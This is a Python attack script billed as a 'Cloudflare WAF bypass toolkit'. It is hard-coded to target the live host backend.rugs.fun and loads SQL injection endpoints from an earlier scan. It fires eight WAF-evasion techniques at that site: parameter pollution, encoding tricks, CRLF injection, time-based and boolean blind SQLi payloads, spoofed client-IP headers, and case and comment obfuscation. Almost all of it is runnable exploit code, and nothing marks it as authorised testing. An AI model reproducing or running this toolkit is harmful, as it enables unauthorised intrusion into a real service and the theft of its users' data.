#!/usr/bin/env python3
"""
💀 CLOUDFLARE WAF BYPASS TOOLKIT 💀
Multiple techniques to bypass Cloudflare and exploit backend.rugs.fun
"""

import requests
import time
import random
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import json
from datetime import datetime

class CloudflareBypass:
    def __init__(self, target):
        self.target = target
        self.results = []
        
        # Rotating user agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0'
        ]
    
    def log(self, msg, level="INFO"):
        colors = {"INFO": "\033[94m", "SUCCESS": "\033[92m", "CRITICAL": "\033[91m", "WARNING": "\033[93m"}
        print(f"{colors.get(level, '')}{datetime.now().strftime('%H:%M:%S')} [{level}] {msg}\033[0m")
    
    # ========================================================================
    # TECHNIQUE 1: HTTP PARAMETER POLLUTION (HPP)
    # ========================================================================
    
    def hpp_bypass(self, endpoint, param, payload):
        """HTTP Parameter Pollution to confuse WAF"""
        self.log(f"🔥 TECHNIQUE 1: HPP on {endpoint}", "CRITICAL")
        
        # Multiple ways to send same parameter
        variations = [
            # Standard
            f"{endpoint}?{param}={urllib.parse.quote(payload)}",
            
            # Duplicate parameters
            f"{endpoint}?{param}=safe&{param}={urllib.parse.quote(payload)}",
            
            # Array notation
            f"{endpoint}?{param}[]={urllib.parse.quote(payload)}",
            
            # Case variations
            f"{endpoint}?{param.upper()}={urllib.parse.quote(payload)}",
            f"{endpoint}?{param.lower()}={urllib.parse.quote(payload)}",
            
            # URL encoding variations
            f"{endpoint}?{param}={urllib.parse.quote(payload, safe='')}",
            
            # Double encoding
            f"{endpoint}?{param}={urllib.parse.quote(urllib.parse.quote(payload))}",
        ]
        
        results = []
        for url in variations:
            try:
                r = requests.get(f"{self.target}{url}", timeout=10, verify=False,
                               headers={'User-Agent': random.choice(self.user_agents)})
                
                # Check if we bypassed WAF (not getting challenge page)
                if "Just a moment" not in r.text and len(r.text) > 100:
                    self.log(f"✅ HPP BYPASS SUCCESS: {url[:80]}", "SUCCESS")
                    results.append({
                        "technique": "HPP",
                        "url": url,
                        "status": r.status_code,
                        "response_length": len(r.text),
                        "response_preview": r.text[:500]
                    })
            except Exception as e:
                pass
        
        return results
    
    # ========================================================================
    # TECHNIQUE 2: ENCODING OBFUSCATION
    # ========================================================================
    
    def encoding_bypass(self, endpoint, param, payload):
        """Multiple encoding techniques to evade WAF"""
        self.log(f"🔥 TECHNIQUE 2: ENCODING OBFUSCATION on {endpoint}", "CRITICAL")
        
        # Various encoding methods
        encodings = [
            # URL encoding
            urllib.parse.quote(payload),
            
            # Double URL encoding
            urllib.parse.quote(urllib.parse.quote(payload)),
            
            # Unicode encoding
            ''.join([f'%u{ord(c):04x}' for c in payload]),
            
            # Hex encoding
            ''.join([f'%{ord(c):02x}' for c in payload]),
            
            # Mixed case hex
            ''.join([f'%{ord(c):02X}' if i % 2 else f'%{ord(c):02x}' for i, c in enumerate(payload)]),
            
            # HTML entity encoding
            ''.join([f'&#{ord(c)};' for c in payload]),
            
            # Base64 (if backend decodes it)
            __import__('base64').b64encode(payload.encode()).decode(),
        ]
        
        results = []
        for encoded in encodings:
            url = f"{endpoint}?{param}={encoded}"
            try:
                r = requests.get(f"{self.target}{url}", timeout=10, verify=False,
                               headers={'User-Agent': random.choice(self.user_agents)})
                
                if "Just a moment" not in r.text and len(r.text) > 100:
                    self.log(f"✅ ENCODING BYPASS SUCCESS: {encoded[:50]}", "SUCCESS")
                    results.append({
                        "technique": "ENCODING",
                        "url": url,
                        "encoding": encoded[:100],
                        "status": r.status_code,
                        "response": r.text[:500]
                    })
            except Exception as e:
                pass
        
        return results
    
    # ========================================================================
    # TECHNIQUE 3: REQUEST SMUGGLING / SPLITTING
    # ========================================================================
    
    def request_smuggling(self, endpoint, param, payload):
        """HTTP Request Smuggling to confuse WAF"""
        self.log(f"🔥 TECHNIQUE 3: REQUEST SMUGGLING on {endpoint}", "CRITICAL")
        
        results = []
        
        # Method 1: Line feed injection
        smuggled_payloads = [
            f"{payload}\r\n",
            f"{payload}\n",
            f"{payload}%0d%0a",
            f"{payload}%0a",
            f"{payload}\r\nX-Ignore: ",
        ]
        
        for smuggled in smuggled_payloads:
            url = f"{endpoint}?{param}={urllib.parse.quote(smuggled)}"
            try:
                r = requests.get(f"{self.target}{url}", timeout=10, verify=False,
                               headers={'User-Agent': random.choice(self.user_agents)})
                
                if "Just a moment" not in r.text and len(r.text) > 100:
                    self.log(f"✅ SMUGGLING BYPASS SUCCESS", "SUCCESS")
                    results.append({
                        "technique": "SMUGGLING",
                        "url": url,
                        "response": r.text[:500]
                    })
            except Exception as e:
                pass
        
        return results
    
    # ========================================================================
    # TECHNIQUE 4: TIMING-BASED BLIND SQLi (BYPASS WAF)
    # ========================================================================
    
    def timing_sqli_bypass(self, endpoint, param):
        """Timing-based SQL injection - harder for WAF to detect"""
        self.log(f"🔥 TECHNIQUE 4: TIMING-BASED SQLi on {endpoint}", "CRITICAL")
        
        # Timing payloads - if response is delayed, SQLi works
        timing_payloads = [
            "1' AND SLEEP(5)--",
            "1' AND (SELECT SLEEP(5))--",
            "1' AND IF(1=1, SLEEP(5), 0)--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1' AND BENCHMARK(5000000, MD5('test'))--",
            "1'; WAITFOR DELAY '0:0:5'--",
        ]
        
        results = []
        
        for payload in timing_payloads:
            url = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
            
            try:
                # Measure response time
                start_time = time.time()
                r = requests.get(f"{self.target}{url}", timeout=15, verify=False,
                               headers={'User-Agent': random.choice(self.user_agents)})
                elapsed_time = time.time() - start_time
                
                # If response took > 4 seconds, likely SQLi worked
                if elapsed_time > 4:
                    self.log(f"💎 TIMING SQLi SUCCESS: {elapsed_time:.2f}s delay", "CRITICAL")
                    results.append({
                        "technique": "TIMING_SQLI",
                        "url": url,
                        "payload": payload,
                        "delay": elapsed_time,
                        "success": True
                    })
                else:
                    self.log(f"❌ No delay: {elapsed_time:.2f}s", "INFO")
            except Exception as e:
                pass
        
        return results
    
    # ========================================================================
    # TECHNIQUE 5: BOOLEAN-BASED BLIND SQLi
    # ========================================================================
    
    def boolean_sqli_bypass(self, endpoint, param):
        """Boolean-based blind SQLi - check response differences"""
        self.log(f"🔥 TECHNIQUE 5: BOOLEAN-BASED SQLi on {endpoint}", "CRITICAL")
        
        # Test payloads: TRUE vs FALSE
        true_payload = "1' AND '1'='1"
        false_payload = "1' AND '1'='2"
        
        results = []
        
        try:
            # Send TRUE payload
            r_true = requests.get(f"{self.target}{endpoint}?{param}={urllib.parse.quote(true_payload)}", 
                                 timeout=10, verify=False,
                                 headers={'User-Agent': random.choice(self.user_agents)})
            
            time.sleep(1)
            
            # Send FALSE payload
            r_false = requests.get(f"{self.target}{endpoint}?{param}={urllib.parse.quote(false_payload)}", 
                                  timeout=10, verify=False,
                                  headers={'User-Agent': random.choice(self.user_agents)})
            
            # If responses are different, SQLi works
            if len(r_true.text) != len(r_false.text) or r_true.status_code != r_false.status_code:
                self.log(f"💎 BOOLEAN SQLi SUCCESS: TRUE={len(r_true.text)}b vs FALSE={len(r_false.text)}b", "CRITICAL")
                results.append({
                    "technique": "BOOLEAN_SQLI",
                    "endpoint": endpoint,
                    "true_length": len(r_true.text),
                    "false_length": len(r_false.text),
                    "success": True
                })
        except Exception as e:
            pass
        
        return results
    
    # ========================================================================
    # TECHNIQUE 6: IP ROTATION / DISTRIBUTED ATTACK
    # ========================================================================
    
    def ip_rotation_bypass(self, endpoint, param, payload):
        """Simulate requests from different IPs to evade rate limiting"""
        self.log(f"🔥 TECHNIQUE 6: IP ROTATION on {endpoint}", "CRITICAL")
        
        # Headers that can spoof IP
        fake_ips = [
            f"203.0.113.{random.randint(1, 254)}",
            f"198.51.100.{random.randint(1, 254)}",
            f"192.0.2.{random.randint(1, 254)}",
            f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}",
        ]
        
        results = []
        
        for fake_ip in fake_ips:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'X-Forwarded-For': fake_ip,
                'X-Real-IP': fake_ip,
                'X-Originating-IP': fake_ip,
                'X-Remote-IP': fake_ip,
                'X-Client-IP': fake_ip,
            }
            
            url = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
            
            try:
                r = requests.get(f"{self.target}{url}", timeout=10, verify=False, headers=headers)
                
                if "Just a moment" not in r.text and len(r.text) > 100:
                    self.log(f"✅ IP ROTATION SUCCESS with fake IP: {fake_ip}", "SUCCESS")
                    results.append({
                        "technique": "IP_ROTATION",
                        "fake_ip": fake_ip,
                        "response": r.text[:500]
                    })
            except Exception as e:
                pass
            
            time.sleep(0.5)  # Small delay between requests
        
        return results
    
    # ========================================================================
    # TECHNIQUE 7: CASE VARIATION
    # ========================================================================
    
    def case_variation_bypass(self, endpoint, param, payload):
        """Vary case of SQL keywords to evade signature detection"""
        self.log(f"🔥 TECHNIQUE 7: CASE VARIATION on {endpoint}", "CRITICAL")
        
        # Original payload: ' OR '1'='1
        variations = [
            "' OR '1'='1",
            "' Or '1'='1",
            "' oR '1'='1",
            "' or '1'='1",
            "' OR '1'='1",
            "' OR '1'='1--",
            "' oR '1'='1--",
            "' /**/OR/**/ '1'='1",
            "' %0bOR%0b '1'='1",
        ]
        
        results = []
        
        for variant in variations:
            url = f"{endpoint}?{param}={urllib.parse.quote(variant)}"
            
            try:
                r = requests.get(f"{self.target}{url}", timeout=10, verify=False,
                               headers={'User-Agent': random.choice(self.user_agents)})
                
                if "Just a moment" not in r.text and len(r.text) > 100:
                    self.log(f"✅ CASE VARIATION SUCCESS: {variant}", "SUCCESS")
                    results.append({
                        "technique": "CASE_VARIATION",
                        "payload": variant,
                        "response": r.text[:500]
                    })
            except Exception as e:
                pass
        
        return results
    
    # ========================================================================
    # TECHNIQUE 8: COMMENT OBFUSCATION
    # ========================================================================
    
    def comment_obfuscation_bypass(self, endpoint, param):
        """Use SQL comments to break up keywords"""
        self.log(f"🔥 TECHNIQUE 8: COMMENT OBFUSCATION on {endpoint}", "CRITICAL")
        
        comment_payloads = [
            "' OR/**/'1'='1",
            "' /**/OR/**/ '1'='1",
            "' /*!OR*/ '1'='1",
            "' OR--\n'1'='1",
            "' O/**/R '1'='1",
            "' %0bOR%0b '1'='1",
            "' OR\t'1'='1",
            "' OR\r\n'1'='1",
        ]
        
        results = []
        
        for payload in comment_payloads:
            url = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
            
            try:
                r = requests.get(f"{self.target}{url}", timeout=10, verify=False,
                               headers={'User-Agent': random.choice(self.user_agents)})
                
                if "Just a moment" not in r.text and len(r.text) > 100:
                    self.log(f"✅ COMMENT OBFUSCATION SUCCESS", "SUCCESS")
                    results.append({
                        "technique": "COMMENT_OBFUSCATION",
                        "payload": payload,
                        "response": r.text[:500]
                    })
            except Exception as e:
                pass
        
        return results
    
    # ========================================================================
    # MASTER BYPASS FUNCTION
    # ========================================================================
    
    def bypass_all_techniques(self, sqli_endpoints):
        """Run ALL bypass techniques on all SQLi endpoints"""
        self.log("💀🔥 RUNNING ALL CLOUDFLARE BYPASS TECHNIQUES 🔥💀", "CRITICAL")
        
        all_results = {
            "hpp": [],
            "encoding": [],
            "smuggling": [],
            "timing_sqli": [],
            "boolean_sqli": [],
            "ip_rotation": [],
            "case_variation": [],
            "comment_obfuscation": []
        }
        
        for sqli in sqli_endpoints:
            endpoint = sqli["location"].split("?")[0]
            param = sqli["location"].split("?")[1].split("=")[0] if "?" in sqli["location"] else "id"
            payload = sqli.get("payload", "' OR '1'='1")
            
            self.log(f"\n{'='*60}", "INFO")
            self.log(f"TARGET: {endpoint}?{param}=", "CRITICAL")
            self.log(f"{'='*60}", "INFO")
            
            # Run all techniques
            all_results["hpp"].extend(self.hpp_bypass(endpoint, param, payload))
            all_results["encoding"].extend(self.encoding_bypass(endpoint, param, payload))
            all_results["smuggling"].extend(self.request_smuggling(endpoint, param, payload))
            all_results["timing_sqli"].extend(self.timing_sqli_bypass(endpoint, param))
            all_results["boolean_sqli"].extend(self.boolean_sqli_bypass(endpoint, param))
            all_results["ip_rotation"].extend(self.ip_rotation_bypass(endpoint, param, payload))
            all_results["case_variation"].extend(self.case_variation_bypass(endpoint, param, payload))
            all_results["comment_obfuscation"].extend(self.comment_obfuscation_bypass(endpoint, param))
            
            time.sleep(1)  # Small delay between endpoints
        
        return all_results

def main():
    import os
    os.makedirs("output/CLOUDFLARE_BYPASS", exist_ok=True)
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║  💀 CLOUDFLARE WAF BYPASS TOOLKIT 💀                      ║
    ║  8 Advanced Techniques to Evade Detection                 ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Load SQLi endpoints from previous scan
    import json
    with open("output/REAL_BACKEND_RUGS_FUN/scan_20260705_214101.json", 'r') as f:
        scan_data = json.load(f)
    
    sqli_endpoints = [v for v in scan_data["vulnerabilities"] if v["type"] == "SQLI_ERROR_BASED"]
    
    print(f"📊 Found {len(sqli_endpoints)} SQLi endpoints to bypass")
    print()
    
    # Initialize bypass toolkit
    bypass = CloudflareBypass("https://backend.rugs.fun")
    
    # Run all bypass techniques
    results = bypass.bypass_all_techniques(sqli_endpoints)
    
    # Save results
    with open("output/CLOUDFLARE_BYPASS/bypass_results.json", 'w') as f:
        json.dump(results, f, indent=2)
    
    # Print summary
    print("\n" + "="*60)
    print("💀 CLOUDFLARE BYPASS SUMMARY 💀")
    print("="*60)
    
    total_successes = sum(len(v) for v in results.values())
    
    for technique, result_list in results.items():
        if result_list:
            print(f"✅ {technique.upper()}: {len(result_list)} successful bypasses")
        else:
            print(f"❌ {technique.upper()}: No bypasses found")
    
    print(f"\n💎 TOTAL SUCCESSFUL BYPASSES: {total_successes}")
    print(f"📁 Results saved to: output/CLOUDFLARE_BYPASS/bypass_results.json")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
